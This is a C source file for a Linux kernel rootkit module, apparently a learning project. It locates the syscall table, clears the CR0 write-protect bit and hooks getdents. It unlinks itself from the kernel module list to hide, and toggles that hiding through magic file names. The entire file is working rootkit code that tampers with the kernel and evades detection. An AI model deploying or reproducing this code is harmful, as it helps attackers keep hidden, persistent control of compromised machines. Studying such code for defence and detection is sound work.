#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kallsyms.h>

MODULE_LICENSE("GPL");

#define DEBUG
#define HIDE_MAGIC "magichidecommand"
#define UNHIDE_MAGIC "magicunhidecommand"

struct linux_dirent {
               unsigned long  d_ino;     /* Inode number */
               unsigned long  d_off;     /* Offset to next linux_dirent */
               unsigned short d_reclen;  /* Length of this linux_dirent */
               char           d_name[];  /* Filename (null-terminated) */
};

static unsigned long ** p_sys_call_table;
asmlinkage int (*original_getdents)(const struct pt_regs * pt_regs);

static struct list_head *prev_module;

static int is_hidden = 0;


/*
* Function: hide_module
* ---------------------
* if the module is in the module list, remove it.
*/
void hide_module(void) {
    if (is_hidden)
    {
        return;
    }
    prev_module = THIS_MODULE->list.prev;
    #ifdef DEBUG
    printk(KERN_INFO "[DEBUG] rootkit prev_module: %p, name: %s\n", prev_module);
    printk(KERN_INFO "[DEBUG] rootkit prev_module->next: %p\n", prev_module->next);
    printk(KERN_INFO "[DEBUG] rootkit this_module: %p\n", &THIS_MODULE->list);
    printk(KERN_INFO "[DEBUG] rootkit next_module: %p\n", THIS_MODULE->list.next);
    #endif
    list_del(&THIS_MODULE->list);
    #ifdef DEBUG
    printk(KERN_INFO "[DEBUG] rootkit prev_module: %p\n", prev_module);
    printk(KERN_INFO "[DEBUG] rootkit prev_module->next: %p\n", prev_module->next);
    printk(KERN_INFO "[DEBUG] rootkit this_module: %p\n", &THIS_MODULE->list);
    printk(KERN_INFO "[DEBUG] rootkit next_module: %p\n", THIS_MODULE->list.next);
    #endif
    is_hidden = 1;
}


/*
* Function: unhide_module
* ---------------------
* if the module is not in the module list, add it.
* TODO: what to do if prev_module is removed from the list?
*/
void unhide_module(void) {
    if (!is_hidden)
    {
        return;
    }
    #ifdef DEBUG
    printk(KERN_INFO "[DEBUG] rootkit prev_module: %p\n", prev_module);
    printk(KERN_INFO "[DEBUG] rootkit prev_module->next: %p\n", prev_module->next);
    printk(KERN_INFO "[DEBUG] rootkit this_module: %p\n", &THIS_MODULE->list);
    printk(KERN_INFO "[DEBUG] rootkit next_module: %p\n", THIS_MODULE->list.next);
    #endif
    list_add(&THIS_MODULE->list, prev_module);
    #ifdef DEBUG
    printk(KERN_INFO "[DEBUG] rootkit prev_module: %p\n", prev_module);
    printk(KERN_INFO "[DEBUG] rootkit prev_module->next: %p\n", prev_module->next);
    printk(KERN_INFO "[DEBUG] rootkit this_module: %p\n", &THIS_MODULE->list);
    printk(KERN_INFO "[DEBUG] rootkit next_module: %p\n", THIS_MODULE->list.next);
    #endif
    is_hidden = 0;
}

/*
* Function: hooked_getdents
* -------------------------
* This function is the hook for getdents
* calling the original getdents, going over the output and checking for the magic commands.
* if found, run the requested command.
* return the length of the structs. just like the original getdents returns.
*/
asmlinkage int hooked_getdents(const struct pt_regs * pt_regs)
{
    printk(KERN_INFO "[+] rootkit successfull hook!\n");
    int ret = original_getdents(pt_regs);
    struct linux_dirent *dir, *kdirent= NULL;
    // si is the second arguments on x86_64 (man syscall)
    struct linux_dirent __user *dirent = (struct linux_dirent *)pt_regs->si;

    unsigned long i = 0;

    int err;
    if (ret <= 0)
    {
        printk(KERN_INFO "[-] rootkit error in original_getdents call\n");
        return ret;
    }
    printk(KERN_INFO "[+] rootkit original_getdents return value: %d\n", ret);
    
    kdirent = (void*) kvzalloc(ret, GFP_KERNEL);
    if (NULL == kdirent)
    {
        return ret;
    }

    err = copy_from_user((void*) kdirent, dirent, (unsigned long)ret);

    if (err)
    {
        printk(KERN_INFO "[-] rootkit error in copy_from_user 1\n");
        kvfree(kdirent);
        return ret;
    }
    printk(KERN_INFO "[+] rootkit success on copy_from_user 1\n");

    while (i < ret)
    {
        dir = (void *) kdirent + i;
        
        #ifdef DEBUG
        //printk(KERN_INFO "[DEBUG] rootkit dir name: %s\n", (char*)dir->d_name);
        #endif

        if ((strlen((char*) dir->d_name) == strlen(UNHIDE_MAGIC)) && (memcmp(UNHIDE_MAGIC, (char*) dir->d_name, strlen(UNHIDE_MAGIC)) == 0))
        {
            //printk(KERN_INFO "[DEBUG] rootkit found the correct file name. unhiding module!\n");
            unhide_module();
        }
        else if ((strlen((char*) dir->d_name) == strlen(HIDE_MAGIC)) && (memcmp(HIDE_MAGIC, (char*) dir->d_name, strlen(HIDE_MAGIC)) == 0))
        {
            //printk(KERN_INFO "[DEBUG] rootkit found the correct file name. hiding module!\n");
            hide_module();
        }
        i += dir->d_reclen;
    }

    kvfree(kdirent);
    return ret;
}


/*
* Function: disable_wp_protection
* -------------------------------
* This function changing the 16'th bit on the cr0 register
* changing this bit enable us to write to ro pages.
*/
static void disable_wp_protection(void)
{
    unsigned long value;
    asm volatile ("mov %%cr0, %0":"=r" (value));

    if (!(value & 0x00010000))
        return;

    asm volatile ("mov %0, %%cr0"::"r" (value & ~0x00010000));
}

/*
* Function: enable_wp_protection
* ------------------------------
* This function changing the 16'th bit on the cr0 register
* changing this bit disable us to write to ro pages.
*/
static void enable_wp_protection(void)
{
    unsigned long value;
    asm volatile ("mov %%cr0, %0":"=r" (value));

    if ((value & 0x00010000))
        return;

    asm volatile ("mov %0, %%cr0"::"r" (value | 0x00010000));
}


/*
* Function: register_hooks
* ------------------------
* This function registering our hooks by changing the syscall table to our hooked functions.
*/
static void register_hooks(void){
    // Change the sys_call_table pointer to out pointer.
    printk(KERN_INFO "[+] rootkit setting the getdents pointers to out pointer. ours: %p\n", hooked_getdents);
    disable_wp_protection();
    p_sys_call_table[__NR_getdents] = (unsigned long)hooked_getdents;
    enable_wp_protection();
}


/*
* Function: unregister_hooks
* --------------------------
* This function unregistering our hooks by changing the syscall table to the original pointers.
*/
static void unregister_hooks(void){
    printk(KERN_INFO "[+] rootkit exit_rootkit\n");
    disable_wp_protection();
    p_sys_call_table[__NR_getdents] = (unsigned long)original_getdents;
    enable_wp_protection();
}

/*
* Function: set_original_addresses
* --------------------------------
* This function setting the pointer to the original functions.
* Then, when we want we can call them to get the original values.
* Getting the information directly from the syscall table.
* return 1 - error. 0 - success.
*/
static int set_original_addresses(void)
{
    original_getdents = (void *)p_sys_call_table[__NR_getdents];
    if (0 == original_getdents)
    {
        printk(KERN_INFO "[-] rootkit Error finding the original_getdents\n");
        return 1;
    }
    printk(KERN_INFO "[+] rootkit original_getdents = %p\n", original_getdents);

    return 0;

}

static int __init init_rootkit(void) {
    printk(KERN_INFO "[+] rootkit init_rootkit\n");
    int err;
    //Find the sys_call_table pointer in the kernel, you can check in /proc/kallsyms if its the same pointer.
    p_sys_call_table = (void *) kallsyms_lookup_name("sys_call_table");
    if (0 == p_sys_call_table)
    {
        printk(KERN_INFO "[!] rootkit Error Finding sys_call_table\n");
        return 1;
    }
    printk(KERN_INFO "[+] rootkit p_sys_call_table = %p\n", p_sys_call_table);

    err = set_original_addresses();
    if(err){
        printk(KERN_INFO "[-] rootkit there was an error finding original function pointers. not setting hooks.\n");        
        return 1;
    }

    register_hooks();
    hide_module();

    return 0;
}

static void __exit exit_rootkit(void) {
    printk(KERN_INFO "[+] rootkit exit_rootkit\n");    
    unregister_hooks();
    return;
}

module_init(init_rootkit);
module_exit(exit_rootkit);